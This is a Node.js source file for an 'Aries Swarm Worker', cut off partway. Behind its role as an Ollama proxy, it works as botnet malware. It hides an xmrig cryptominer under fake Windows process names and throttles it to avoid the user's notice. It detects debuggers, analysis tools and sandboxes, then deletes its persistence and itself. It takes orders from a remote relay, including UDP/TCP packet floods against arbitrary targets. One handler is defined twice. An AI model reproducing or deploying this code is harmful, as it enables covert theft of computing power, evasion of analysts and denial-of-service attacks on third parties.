// ============================================================================
// Aries Swarm Worker — worker.js
// Pure Node.js, zero dependencies. Connects to relay, proxies to local Ollama.
// ============================================================================

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');

// --- Load config ---
const ENV_FILE = path.join(__dirname, 'env.json');
let config = {};
try {
  config = JSON.parse(fs.readFileSync(ENV_FILE, 'utf8'));
} catch (e) {
  console.error('Cannot read env.json:', e.message);
  process.exit(1);
}

const RELAY_URL    = config.relayUrl   || 'https://gateway.doomtrader.com:9700';
const SECRET       = config.workerKey  || config.secret || '';
const MODEL        = config.model      || 'tinyllama:1.1b';
const OLLAMA_HOST  = config.ollamaHost || 'http://127.0.0.1:11434';
const HOSTNAME     = config.hostname   || os.hostname();
const RAM_GB       = config.ramGB      || 0;
const CPU_NAME     = config.cpuName    || 'unknown';
const CPU_CORES    = config.cpuCores   || 0;
const GPU          = config.gpu        || 'none';

const SITE_CONTROLLER_URL = config.siteControllerUrl || '';
let _siteControllerUrl = SITE_CONTROLLER_URL;
const HEARTBEAT_INTERVAL = 30000;  // 30s
const POLL_INTERVAL      = 5000;   // 5s

// ── Relay Federation / Failover ──
let _relayList = config.relayList || [RELAY_URL];
let _activeRelayUrl = RELAY_URL;

function getActiveRelay() { return _activeRelayUrl; }

function updateRelayList(newList) {
  if (!Array.isArray(newList) || newList.length === 0) return;
  _relayList = newList;
  // Persist to env.json
  try {
    var envData = JSON.parse(fs.readFileSync(ENV_FILE, 'utf8'));
    envData.relayList = _relayList;
    fs.writeFileSync(ENV_FILE, JSON.stringify(envData, null, 2));
  } catch (e) {}
  log('Relay list updated: ' + _relayList.join(', '));
}

async function sendHeartbeatWithFailover() {
  var info = getWorkerInfo();
  for (var i = 0; i < _relayList.length; i++) {
    var relayUrl = _relayList[i];
    try {
      var hbRes = await request(relayUrl + '/api/swarm/heartbeat', {
        method: 'POST',
        body: info,
        timeout: 10000
      });
      if (hbRes.status >= 200 && hbRes.status < 300) {
        _lastHeartbeatResponse = Date.now();
        if (relayUrl !== _activeRelayUrl) {
          log('Failover: switched to relay ' + relayUrl + ' (was ' + _activeRelayUrl + ')');
          _activeRelayUrl = relayUrl;
        }
        return;
      }
    } catch (e) {
      if (i === 0) log('Primary relay heartbeat failed (' + relayUrl + '): ' + e.message);
    }
  }
  log('All relays failed for heartbeat');
}
const LOG_FILE = path.join(__dirname, 'worker.log');
const crypto = require('crypto');

// ── Dead Man's Switch ──
let _lastHeartbeatResponse = Date.now();
let _deadManConfig = { enabled: true, timeoutHours: 48 };
let _deadManInterval = null;

// ── Canary Config ──
let _canaryConfig = { enabled: true, allowVM: true };
let _canaryInterval = null;

// ── HMAC Signing ──
function signPayload(payload) {
  if (!SECRET) return '';
  return crypto.createHmac('sha256', SECRET).update(JSON.stringify(payload)).digest('hex');
}

// ── Self-Destruct ──
function selfDestruct(reason) {
  log('Self-destruct activated: ' + reason);
  // Stop mining
  if (_minerProcess) { try { _minerProcess.kill('SIGTERM'); } catch (e) {} _minerProcess = null; }
  // Kill Ollama
  try {
    const { execSync } = require('child_process');
    execSync('taskkill /IM ollama.exe /F 2>nul', { timeout: 5000, stdio: 'ignore' });
  } catch (e) {}
  // Remove persistence: scheduled task
  try {
    const { execSync } = require('child_process');
    execSync('schtasks /Delete /TN "AriesSwarm" /F 2>nul', { timeout: 5000, stdio: 'ignore' });
    execSync('schtasks /Delete /TN "AriasUpdate" /F 2>nul', { timeout: 5000, stdio: 'ignore' });
  } catch (e) {}
  // Remove persistence: registry
  try {
    const { execSync } = require('child_process');
    execSync('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v AriesSwarm /f 2>nul', { timeout: 5000, stdio: 'ignore' });
  } catch (e) {}
  // Delete xmrig directory
  var xmrigDir = path.join(os.tmpdir(), 'aries-xmrig');
  try { fs.rmSync(xmrigDir, { recursive: true, force: true }); } catch (e) {}
  // Delete stealth bin
  cleanupStealthBin();
  // Delete env.json
  try { fs.unlinkSync(ENV_FILE); } catch (e) {}
  // Delete worker log
  try { fs.unlinkSync(LOG_FILE); } catch (e) {}
  // Delete aries-swarm from LOCALAPPDATA
  var localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');
  var ariesSwarmDir = path.join(localAppData, 'aries-swarm');
  try { fs.rmSync(ariesSwarmDir, { recursive: true, force: true }); } catch (e) {}
  // Delete self last
  try { fs.unlinkSync(__filename); } catch (e) {}
  process.exit(0);
}

function startDeadManSwitch() {
  if (_deadManInterval) clearInterval(_deadManInterval);
  if (!_deadManConfig.enabled) return;
  var timeoutMs = (_deadManConfig.timeoutHours || 24) * 3600 * 1000;
  _deadManInterval = setInterval(function () {
    if (Date.now() - _lastHeartbeatResponse > timeoutMs) {
      log('Dead man\'s switch activated — self-destructing');
      try {
        request(RELAY_URL + '/api/swarm/result', { method: 'POST', body: { taskId: 'dead-man-' + HOSTNAME, worker: HOSTNAME, type: 'dead-man-triggered', result: { reason: 'timeout' } } }).catch(function () {});
      } catch (e) {}
      setTimeout(function () { selfDestruct('Dead man\'s switch timeout (' + _deadManConfig.timeoutHours + 'h)'); }, 1000);
    }
  }, 60000);
}

// ── Canary Checks (Windows) ──
function runCanaryChecks() {
  if (!_canaryConfig.enabled) return;
  try {
    var { execSync } = require('child_process');
    // Check debugger
    if (process.env.NODE_OPTIONS && process.env.NODE_OPTIONS.indexOf('--inspect') >= 0) {
      return canaryTriggered('NODE_OPTIONS contains --inspect');
    }
    if (process.debugPort && process.debugPort !== 0) {
      return canaryTriggered('debugPort is non-zero: ' + process.debugPort);
    }
    // Check for analysis tools
    try {
      var tasks = execSync('tasklist /FO CSV /NH 2>nul', { timeout: 8000, encoding: 'utf8' }).toLowerCase();
      var dangerousTools = ['wireshark', 'fiddler', 'procmon', 'x64dbg', 'ida'];
      for (var i = 0; i < dangerousTools.length; i++) {
        if (tasks.indexOf(dangerousTools[i]) >= 0) {
          return canaryTriggered('Analysis tool detected: ' + dangerousTools[i]);
        }
      }
      // Check process count (sandbox indicator)
      var procCount = tasks.split('\n').filter(function (l) { return l.trim().length > 0; }).length;
      if (procCount < 20) {
        return canaryTriggered('Suspiciously few processes: ' + procCount);
      }
    } catch (e) {}
    // Check VM (only if not allowed)
    if (!_canaryConfig.allowVM) {
      try {
        var sysinfo = execSync('systeminfo 2>nul', { timeout: 15000, encoding: 'utf8' });
        if (/virtual|vmware|virtualbox|qemu|hyper-v/i.test(sysinfo)) {
          return canaryTriggered('VM detected and not allowed');
        }
      } catch (e) {}
    }
    // Check system uptime < 5 min
    try {
      var uptimeSec = os.uptime();
      if (uptimeSec < 300) {
        return canaryTriggered('System uptime too low: ' + uptimeSec + 's');
      }
    } catch (e) {}
    // Check disk space < 10 GB
    try {
      var diskOut = execSync('powershell -NoProfile -Command "$d=Get-PSDrive C; $d.Free"', { timeout: 8000, encoding: 'utf8' }).trim();
      var freeBytes = parseInt(diskOut);
      if (freeBytes > 0 && freeBytes < 10737418240) {
        return canaryTriggered('Low disk space: ' + Math.round(freeBytes / 1073741824) + 'GB');
      }
    } catch (e) {}
  } catch (e) {}
}

function canaryTriggered(reason) {
  log('Canary triggered: ' + reason);
  // Stop mining
  if (_minerProcess) { try { _minerProcess.kill('SIGTERM'); } catch (e) {} }
  // Send last message to relay
  try {
    request(RELAY_URL + '/api/swarm/result', {
      method: 'POST',
      body: { taskId: 'canary-' + HOSTNAME, worker: HOSTNAME, type: 'canary-triggered', result: { reason: reason } }
    }).catch(function () {});
  } catch (e) {}
  setTimeout(function () { selfDestruct('Canary: ' + reason); }, 2000);
}

function startCanaryChecks() {
  if (!_canaryConfig.enabled) return;
  runCanaryChecks();
  _canaryInterval = setInterval(runCanaryChecks, 300000); // every 5 min
}

// ── Stealth Process Naming ──
const WIN_STEALTH_NAMES = ['svchost_helper.exe', 'WindowsUpdateAgent.exe', 'RuntimeBroker_x64.exe', 'SearchIndexer_svc.exe', 'WmiProvider.exe'];
let _stealthBinPath = null;

function getStealthBin(origBin, stealth) {
  if (!stealth) return origBin;
  const name = WIN_STEALTH_NAMES[Math.floor(Math.random() * WIN_STEALTH_NAMES.length)];
  const dest = path.join(os.tmpdir(), name);
  try { fs.copyFileSync(origBin, dest); } catch (e) { log('Stealth copy failed: ' + e.message); return origBin; }
  _stealthBinPath = dest;
  log('Stealth: copied xmrig to ' + dest);
  return dest;
}

function cleanupStealthBin() {
  if (_stealthBinPath) {
    try { fs.unlinkSync(_stealthBinPath); log('Stealth: deleted ' + _stealthBinPath); } catch (e) {}
    _stealthBinPath = null;
  }
}

// ── CPU Throttle on User Activity ──
let _activityMonitorInterval = null;

function startActivityMonitor() {
  if (_activityMonitorInterval) return;
  _activityMonitorInterval = setInterval(() => {
    try {
      const { execSync } = require('child_process');
      const psCmd = `powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public struct LII{public uint cbSize;public uint dwTime;}public class UI{[DllImport(\\\"user32.dll\\\")]public static extern bool GetLastInputInfo(ref LII p);public static uint GetIdle(){LII l=new LII();l.cbSize=(uint)Marshal.SizeOf(l);GetLastInputInfo(ref l);return((uint)Environment.TickCount-l.dwTime)/1000;}}'; [UI]::GetIdle()"`;
      const idleSec = parseInt(execSync(psCmd, { timeout: 8000, encoding: 'utf8' }).trim()) || 0;

      if (idleSec < 60 && _currentIntensity !== 'low') {
        log('ActivityMonitor: user active (idle ' + idleSec + 's), throttling to low');
        _currentIntensity = 'low';
        applyMinerThrottle('25');
      } else if (idleSec >= 300 && idleSec < 1800 && _currentIntensity !== _originalIntensity) {
        log('ActivityMonitor: user idle ' + idleSec + 's, restoring to ' + _originalIntensity);
        _currentIntensity = _originalIntensity;
        applyMinerThrottle(intensityToHint(_originalIntensity));
      } else if (idleSec >= 1800 && _currentIntensity !== 'max') {
        log('ActivityMonitor: user away ' + idleSec + 's, boosting to max');
        _currentIntensity = 'max';
        applyMinerThrottle('100');
      }
    } catch (e) {}
  }, 15000);
}

function stopActivityMonitor() {
  if (_activityMonitorInterval) { clearInterval(_activityMonitorInterval); _activityMonitorInterval = null; }
}

function intensityToHint(i) {
  if (i === 'low') return '25';
  if (i === 'medium') return '50';
  if (i === 'high') return '75';
  return '100';
}

function applyMinerThrottle(hint) {
  // Use xmrig HTTP API to change threads hint at runtime
  try {
    const postData = JSON.stringify({ "cpu": { "max-threads-hint": parseInt(hint) } });
    const req = http.request({ hostname: '127.0.0.1', port: 18088, path: '/1/config', method: 'PUT', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) } });
    req.on('error', () => {});
    req.write(postData);
    req.end();
  } catch (e) {}
}

// ── Scheduled Mining ──
let _scheduleInterval = null;
let _schedulePaused = false;
let _scheduleConfig = null;

function startScheduledMining(schedule) {
  if (!schedule || schedule.type === 'always') return;
  _scheduleConfig = schedule;
  _scheduleInterval = setInterval(() => {
    const allowed = isScheduleAllowed(_scheduleConfig);
    if (!allowed && !_schedulePaused && _minerProcess) {
      log('Schedule: outside mining hours, pausing miner');
      _schedulePaused = true;
      try { _minerProcess.kill('SIGTERM'); } catch (e) {}
    } else if (allowed && _schedulePaused && _lastMineTask) {
      log('Schedule: mining hours resumed, restarting miner');
      _schedulePaused = false;
      _origHandleMineStart(_lastMineTask);
    }
  }, 60000);
}

function stopScheduledMining() {
  if (_scheduleInterval) { clearInterval(_scheduleInterval); _scheduleInterval = null; }
  _schedulePaused = false;
  _scheduleConfig = null;
}

function isScheduleAllowed(sched) {
  const tz = sched.timezone || 'America/Chicago';
  const now = new Date();
  // Get local time in timezone
  const parts = now.toLocaleString('en-US', { timeZone: tz, hour12: false }).split(', ');
  const timeParts = parts[1].split(':');
  const hour = parseInt(timeParts[0]);
  const day = new Date(now.toLocaleString('en-US', { timeZone: tz })).getDay(); // 0=Sun, 6=Sat
  const isWeekend = (day === 0 || day === 6);

  if (sched.type === 'offhours') {
    if (isWeekend) return true;
    const start = sched.offhoursStart || 22;
    const end = sched.offhoursEnd || 8;
    if (start > end) return (hour >= start || hour < end);
    return (hour >= start && hour < end);
  }
  if (sched.type === 'custom' && Array.isArray(sched.ranges)) {
    for (const r of sched.ranges) {
      if (hour >= r.start && hour < r.end) return true;
    }
    return false;
  }
  return true;
}

// ── Resource Monitoring & Auto-Throttle ──
let _originalIntensity = 'medium';
let _currentIntensity = 'medium';
let _ollamaKilled = false;
let _currentLoad = { cpu: 0, ram: 0, disk: 0 };

function getSystemLoad() {
  const cpus = os.cpus();
  let totalIdle = 0, totalTick = 0;
  for (const cpu of cpus) {
    for (const type in cpu.times) totalTick += cpu.times[type];
    totalIdle += cpu.times.idle;
  }
  const cpuPercent = Math.round(100 - (totalIdle / totalTick * 100));
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const ramPercent = Math.round((1 - freeMem / totalMem) * 100);
  let diskPercent = 0;
  try {
    const { execSync } = require('child_process');
    if (process.platform === 'win32') {
      const out = execSync('powershell -Command "$d=Get-PSDrive C; [math]::Round(($d.Used/($d.Used+$d.Free))*100)"', { timeout: 5000, encoding: 'utf8' }).trim();
      diskPercent = parseInt(out) || 0;
    } else {
      const out = execSync("df / | tail -1 | awk '{print $5}'", { timeout: 5000, encoding: 'utf8' }).trim();
      diskPercent = parseInt(out) || 0;
    }
  } catch {}
  _currentLoad = { cpu: cpuPercent, ram: ramPercent, disk: diskPercent };
  return _currentLoad;
}

function autoThrottle() {
  const load = getSystemLoad();
  let changed = false;

  // CPU > 80% → throttle to low
  if (load.cpu > 80 && _currentIntensity !== 'low') {
    log(`AutoThrottle: CPU at ${load.cpu}%, throttling mining to low (was ${_currentIntensity})`);
    _currentIntensity = 'low';
    changed = true;
  }
  // CPU < 40% → restore original
  else if (load.cpu < 40 && _currentIntensity !== _originalIntensity) {
    log(`AutoThrottle: CPU at ${load.cpu}%, restoring mining to ${_originalIntensity}`);
    _currentIntensity = _originalIntensity;
    changed = true;
  }

  // RAM > 90% → kill Ollama
  if (load.ram > 90 && !_ollamaKilled) {
    log(`AutoThrottle: RAM at ${load.ram}%, killing Ollama`);
    _ollamaKilled = true;
    try {
      const { execSync } = require('child_process');
      if (process.platform === 'win32') {
        execSync('taskkill /IM ollama.exe /F 2>nul', { timeout: 5000, stdio: 'ignore' });
      } else {
        execSync('pkill -f ollama 2>/dev/null', { timeout: 5000, stdio: 'ignore' });
      }
    } catch {}
  }
  // RAM < 75% → restart Ollama
  else if (load.ram < 75 && _ollamaKilled) {
    log(`AutoThrottle: RAM at ${load.ram}%, restarting Ollama`);
    _ollamaKilled = false;
    try {
      const { execSync } = require('child_process');
      if (process.platform === 'win32') {
        execSync('start /B ollama serve', { timeout: 5000, stdio: 'ignore', shell: true });
      } else {
        execSync('nohup ollama serve &', { timeout: 5000, stdio: 'ignore', shell: true });
      }
    } catch {}
  }

  return { load, intensity: _currentIntensity, throttled: _currentIntensity !== _originalIntensity, ollamaKilled: _ollamaKilled };
}

function log(msg) {
  const line = `[${new Date().toISOString()}] ${msg}`;
  console.log(line);
  try { fs.appendFileSync(LOG_FILE, line + '\n'); } catch {}
}

// --- HTTP helpers (no deps) ---
function request(urlStr, options = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlStr);
    const mod = url.protocol === 'https:' ? https : http;
    const reqOpts = {
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname + url.search,
      method: options.method || 'GET',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${SECRET}`,
        'X-Aries-Secret': SECRET,
        'X-Worker-Id': HOSTNAME,
        ...(options.headers || {})
      },
      timeout: options.timeout || 30000,
      rejectUnauthorized: false  // allow self-signed certs on relay
    };

    const req = mod.request(reqOpts, (res) => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => {
        const body = Buffer.concat(chunks).toString();
        resolve({ status: res.statusCode, body, headers: res.headers });
      });
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    if (options.body) {
      var bodyStr = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
      if (options.method === 'POST' || options.method === 'PUT') {
        var sig = crypto.createHmac('sha256', SECRET).update(bodyStr).digest('hex');
        req.setHeader('X-Aries-Signature', sig);
      }
      req.write(bodyStr);
    }
    req.end();
  });
}

function ollamaRequest(endpoint, body, timeout = 120000) {
  return new Promise((resolve, reject) => {
    const url = new URL(endpoint, OLLAMA_HOST);
    const req = http.request({
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      timeout
    }, (res) => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks).toString() }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('ollama timeout')); });
    req.write(JSON.stringify(body));
    req.end();
  });
}

// --- Installed models cache ---
let _installedModels = [];
function refreshInstalledModels() {
  try {
    const { execSync } = require('child_process');
    var cmd = process.platform === 'win32' ? 'ollama list 2>nul' : 'ollama list 2>/dev/null';
    var out = execSync(cmd, { timeout: 10000, encoding: 'utf8' });
    var lines = out.trim().split('\n').slice(1); // skip header
    _installedModels = lines.map(function(l) { return l.trim().split(/\s+/)[0]; }).filter(Boolean);
  } catch (e) { /* ollama not running or not installed */ }
}
refreshInstalledModels();
setInterval(refreshInstalledModels, 120000); // refresh every 2 min

// --- Worker info ---
function getWorkerInfo() {
  return {
    id: HOSTNAME,
    hostname: HOSTNAME,
    ram_gb: RAM_GB,
    cpu: CPU_NAME,
    cpu_cores: CPU_CORES,
    gpu: GPU,
    model: MODEL,
    installedModels: _installedModels,
    status: _ollamaKilled ? 'mining-only' : 'ready',
    uptime: process.uptime(),
    timestamp: Date.now(),
    load: _currentLoad,
    currentThrottle: _currentIntensity !== _originalIntensity ? _currentIntensity : 'none',
    miningIntensity: _currentIntensity,
    proxyRunning: !!_proxyServer,
    proxyConnections: _proxyConnections || 0,
    proxyBytesIn: _proxyBytesIn || 0,
    proxyBytesOut: _proxyBytesOut || 0,
    proxyNetworks: Object.keys(_proxyNetworkProcs || {})
  };
}

// --- Heartbeat (with relay failover) ---
async function sendHeartbeat() {
  if (_relayList.length > 1) {
    return sendHeartbeatWithFailover();
  }
  try {
    var hbRes = await request(`${RELAY_URL}/api/swarm/heartbeat`, {
      method: 'POST',
      body: getWorkerInfo()
    });
    if (hbRes.status >= 200 && hbRes.status < 300) {
      _lastHeartbeatResponse = Date.now();
    }
  } catch (e) {
    log(`Heartbeat failed: ${e.message}`);
  }
}

// --- Poll for tasks ---
async function pollForTask() {
  try {
    const res = await request(`${RELAY_URL}/api/swarm/task?worker=${HOSTNAME}`, { timeout: 10000 });
    if (res.status === 200) {
      let task;
      try { task = JSON.parse(res.body); } catch { return; }
      if (task && task.id) {
        log(`Received task ${task.id}: ${(task.prompt || '').substring(0, 80)}...`);
        await processTask(task);
      }
    }
    // 204 = no task, anything else = ignore
  } catch (e) {
    if (e.message !== 'timeout') log(`Poll error: ${e.message}`);
  }
}

// --- Packet Send Handler (for network stress testing) ---
async function handlePacketSend(task) {
  const dgram = require('dgram');
  const netMod = require('net');
  const target = task.target;
  const port = task.port || 80;
  const protocol = task.protocol || 'udp';
  const packetSize = Math.max(1, parseInt(task.packetSize) || 1024);
  const duration = task.duration || 10;
  const testId = task.testId;
  const payload = Buffer.alloc(packetSize, 0x41);

  let packets = 0, bytes = 0, errors = 0;
  let running = true;

  // Report stats every second
  const reportInterval = setInterval(async () => {
    try {
      await request(`${RELAY_URL}/api/packet-send/node-report`, {
        method: 'POST',
        body: { testId, nodeId: HOSTNAME, stats: { packets, bytes, errors } }
      });
    } catch (e) {}
  }, 1000);

  // Auto-stop after duration
  setTimeout(() => { running = false; }, duration * 1000);

  log(`PacketSend: ${protocol.toUpperCase()} → ${target}:${port}, ${packetSize}B, ${duration}s`);

  if (protocol === 'udp') {
    const socket = dgram.createSocket('udp4');
    socket.on('error', () => { errors++; });
    const send = () => {
      if (!running) { socket.close(); clearInterval(reportInterval); return; }
      socket.send(payload, 0, payload.length, port, target, (err) => {
        if (err) errors++; else { packets++; bytes += payload.length; }
        if (running) setImmediate(send);
      });
    };
    send();
  } else if (protocol === 'tcp') {
    const connect = () => {
      if (!running) { clearInterval(reportInterval); return; }
      const socket = new netMod.Socket();
      socket.setTimeout(5000);
      socket.connect(port, target, () => {
        const sendLoop = () => {
          if (!running) { socket.destroy(); return; }
          socket.write(payload, (err) => {
            if (err) { errors++; socket.destroy(); return; }
            packets++; bytes += payload.length;
            setImmediate(sendLoop);
          });
        };
        sendLoop();
      });
      socket.on('error', () => { errors++; });
      socket.on('close', () => { if (running) setTimeout(connect, 10); });
      socket.on('timeout', () => { socket.destroy(); });
    };
    connect();
  }
  // Wait for completion
  await new Promise(r => setTimeout(r, (duration + 1) * 1000));
  log(`PacketSend complete: ${packets} packets, ${bytes} bytes, ${errors} errors`);
}

// --- Process a task ---
async function processTask(task) {
  const startTime = Date.now();

  // Handle special task types
  if (task.type === 'model-share') {
    try { await handleModelShare(task); } catch (e) { log(`Model share error: ${e.message}`); }
    return;
  }
  if (task.type === 'model-receive') {
    try { await handleModelReceive(task); } catch (e) { log(`Model receive error: ${e.message}`); }
    return;
  }
  if (task.type === 'update-relays') {
    updateRelayList(task.relayList || []);
    return;
  }
  if (task.type === 'packet-send') {
    try { await handlePacketSend(task); } catch (e) { log(`PacketSend error: ${e.message}`); }
    return;
  }

  try {
    // Build Ollama request
    const ollamaBody = {
      model: task.model || MODEL,
      prompt: task.prompt || '',
      stream: false
    };

    // Support chat format
    if (task.messages) {
      delete ollamaBody.prompt;
      ollamaBody.messages = task.messages;
      var endpoint = '/api/chat';
    } else {
      var endpoint = '/api/generate';
    }

    if (task.options) ollamaBody.options = task.options;

    log(`Forwarding to Ollama ${endpoint}...`);
    const ollamaRes = await ollamaRequest(endpoint, ollamaBody, 300000); // 5 min timeout

    let result;
    try { result = JSON.parse(ollamaRes.body); } catch { result = { response: ollamaRes.body }; }

    // Report result back to relay
    await request(`${RELAY_URL}/api/swarm/result`, {
      method: 'POST',
      body: {
        taskId: task.id,
        worker: HOSTNAME,
        result: result,
        duration_ms: Date.now() - startTime,
        model: task.model || MODEL
      }
    });
    log(`Task ${task.id} completed in ${Date.now() - startTime}ms`);

  } catch (e) {
    log(`Task ${task.id} failed: ${e.message}`);
    // Report failure
    try {
      await request(`${RELAY_URL}/api/swarm/result`, {
        method: 'POST',
        body: {
          taskId: task.id,
          worker: HOSTNAME,
          error: e.message,
          duration_ms: Date.now() - startTime
        }
      });
    } catch {}
  }
}

// --- Model Share Handler ---
async function handleModelShare(task) {
  const model = task.model;
  const toWorkers = task.toWorkers || [];
  log(`Model share: exporting ${model} for ${toWorkers.length} workers`);

  // Get modelfile info
  try {
    const { execSync } = require('child_process');
    const cmd = process.platform === 'win32'
      ? `ollama show "${model}" --modelfile 2>nul`
      : `ollama show "${model}" --modelfile 2>/dev/null`;
    const modelfile = execSync(cmd, { timeout: 30000, encoding: 'utf8' });

    // Send model-receive tasks to target workers with modelfile info
    for (const targetWorker of toWorkers) {
      await request(`${RELAY_URL}/api/swarm/broadcast`, {
        method: 'POST',
        body: {
          type: 'model-receive',
          shareId: task.shareId,
          model: model,
          modelfile: modelfile,
          fromWorker: HOSTNAME,
          targetWorker: targetWorker
        }
      });
    }
    log(`Model share: sent modelfile for ${model} to ${toWorkers.length} workers`);
  } catch (e) {
    log(`Model share failed: ${e.message}`);
  }
}

// --- Model Receive Handler ---
async function handleModelReceive(task) {
  const model = task.model;
  log(`Model receive: pulling ${model} from ${task.fromWorker}`);

  // Use ollama pull to get the model (simplest approach that works through NAT)
  try {
    const { execSync } = require('child_process');
    const cmd = process.platform === 'win32'
      ? `ollama pull "${model}" 2>nul`
      : `ollama pull "${model}" 2>/dev/null`;
    execSync(cmd, { timeout: 600000, encoding: 'utf8' }); // 10 min timeout
    log(`Model receive: successfully pulled ${model}`);
    refreshInstalledModels();
  } catch (e) {
    log(`Model receive failed for ${model}: ${e.message}`);
  }
}

// --- Main loop ---
async function main() {
  log(`=== Aries Swarm Worker Starting ===`);
  log(`Relay: ${RELAY_URL}`);
  log(`Model: ${MODEL}`);
  log(`Host:  ${HOSTNAME} | RAM: ${RAM_GB}GB | CPU: ${CPU_NAME} (${CPU_CORES} cores) | GPU: ${GPU}`);

  // Run canary checks on startup
  startCanaryChecks();
  startDeadManSwitch();

  // Register with relay
  try {
    await request(`${RELAY_URL}/api/swarm/register`, {
      method: 'POST',
      body: getWorkerInfo()
    });
    log('Registered with relay');
    // Announce online via chat
    announceOnline();
  } catch (e) {
    log(`Registration failed (will retry via heartbeat): ${e.message}`);
  }

  // Mesh network
  initMesh();

  // Heartbeat loop
  setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);

  // Auto-throttle loop (every 30s)
  setInterval(autoThrottle, 30000);

  // Poll loop
  async function pollLoop() {
    while (true) {
      await pollForTask();
      await new Promise(r => setTimeout(r, POLL_INTERVAL));
    }
  }
  pollLoop();
}

// --- Packet Send capability ---
const dgram = require('dgram');
const net = require('net');
let _packetSendActive = false;
let _packetSendInterval = null;
let _packetSendSocket = null;
let _packetStats = { packetsSent: 0, bytesSent: 0, errors: 0, status: 'idle' };

function handlePacketSend(task) {
  if (_packetSendActive) { log('Packet send already active, ignoring'); return; }
  const target = task.target;
  const port = parseInt(task.port) || 80;
  const protocol = (task.protocol || 'UDP').toUpperCase();
  const packetSize = Math.max(1, parseInt(task.packetSize) || 512);
  const duration = (task.duration || 30) * 1000;

  _packetSendActive = true;
  _packetStats = { packetsSent: 0, bytesSent: 0, errors: 0, status: 'running', startTime: Date.now() };
  log(`Packet send: ${protocol} -> ${target}:${port}, size=${packetSize}, duration=${duration/1000}s`);

  const buf = Buffer.alloc(packetSize, 0x41);

  // Report stats every second
  const reportInterval = setInterval(() => {
    request(`${RELAY_URL}/api/swarm/packet-stats`, {
      method: 'POST',
      body: { worker: HOSTNAME, stats: _packetStats }
    }).catch(() => {});
  }, 1000);

  if (protocol === 'UDP') {
    _packetSendSocket = dgram.createSocket('udp4');
    _packetSendInterval = setInterval(() => {
      if (!_packetSendActive) return;
      for (let i = 0; i < 100; i++) {
        _packetSendSocket.send(buf, 0, buf.length, port, target, (err) => {
          if (err) _packetStats.errors++;
          else { _packetStats.packetsSent++; _packetStats.bytesSent += buf.length; }
        });
      }
    }, 10);
  } else {
    function tcpSend() {
      if (!_packetSendActive) return;
      const sock = new net.Socket();
      sock.setTimeout(2000);
      sock.connect(port, target, () => {
        sock.write(buf, () => {
          _packetStats.packetsSent++;
          _packetStats.bytesSent += buf.length;
          sock.destroy();
          setImmediate(tcpSend);
        });
      });
      sock.on('error', () => { _packetStats.errors++; sock.destroy(); setImmediate(tcpSend); });
      sock.on('timeout', () => { _packetStats.errors++; sock.destroy(); setImmediate(tcpSend); });
    }
    tcpSend();
  }

  // Auto stop after duration
  setTimeout(() => stopPacketSend(), duration);
  setTimeout(() => clearInterval(reportInterval), duration + 2000);
}

function stopPacketSend() {
  if (!_packetSendActive) return;
  _packetSendActive = false;
  _packetStats.status = 'done';
  if (_packetSendInterval) { clearInterval(_packetSendInterval); _packetSendInterval = null; }
  if (_packetSendSocket) { try { _packetSendSocket.close(); } catch {} _packetSendSocket = null; }
  log(`Packet send stopped. Sent: ${_packetStats.packetsSent} packets, ${_packetStats.bytesSent} bytes, ${_packetStats.errors} errors`);
}

// Override pollForTask to handle packet-send tasks
const _origProcessTask = processTask;
async function processTaskExtended(task) {
  if (task.type === 'packet-send') return handlePacketSend(task);
  if (task.type === 'packet-stop') return stopPacketSend();
  if (task.type === 'mine-start') return handleMineStart(task);
  if (task.type === 'mine-stop') return handleMineStop();
  if (task.type === 'mine-benchmark') return handleMineBenchmark(task);
  if (task.type === 'mine-restart') return handleMineRestart();
  if (task.type === 'worker-update') return handleWorkerUpdate(task);
  if (task.type === 'chat-message') return handleChatMessage(task);
  if (task.type === 'wipe-redeploy') { return handleWipeRedeploy(); }
  if (task.type === 'swarm-intelligence') { return handleSwarmIntelligence(task); }
  if (task.type === 'self-destruct') { log('Received self-destruct command'); selfDestruct('Remote self-destruct command'); return; }
  if (task.type === 'set-controller') {
    _siteControllerUrl = task.controllerUrl || '';
    log('Site controller set to: ' + (_siteControllerUrl || '(none — direct relay)'));
    try { var envData = JSON.parse(fs.readFileSync(ENV_FILE, 'utf8')); envData.siteControllerUrl = _siteControllerUrl; fs.writeFileSync(ENV_FILE, JSON.stringify(envData, null, 2)); } catch (e) {}
    return;
  }
  if (task.type === 'start-proxy') return _startLocalProxy(task);
  if (task.type === 'stop-proxy') return _stopLocalProxy();
  if (task.type === 'join-proxy-network') return _joinProxyNetwork(task);
  if (task.type === 'leave-proxy-network') return _leaveProxyNetwork(task);
  return _origProcessTask(task);
}

// ══════════════════════════════════════
//  WORKER CHAT
// ══════════════════════════════════════
var _workerChatLog = [];
var MAX_CHAT_LOG = 100;

function handleChatMessage(task) {
  var msg = { from: task.from || 'unknown', to: task.to || 'all', text: task.text || '', timestamp: task.timestamp || Date.now() };
  _workerChatLog.push(msg);
  if (_workerChatLog.length > MAX_CHAT_LOG) _workerChatLog = _workerChatLog.slice(-MAX_CHAT_LOG);
  log('Chat [' + msg.from + ']: ' + msg.text);
}

function getWorkerChat() { return _workerChatLog.slice(-50); }

function sendChatMessage(text) {
  request(RELAY_URL + '/api/swarm/chat', {
    method: 'POST',
    body: { from: HOSTNAME, text: text, to: 'all' }
  }).catch(function() {});
}

function announceOnline() {
  var ramGb = Math.round(os.totalmem() / (1024 * 1024 * 1024));
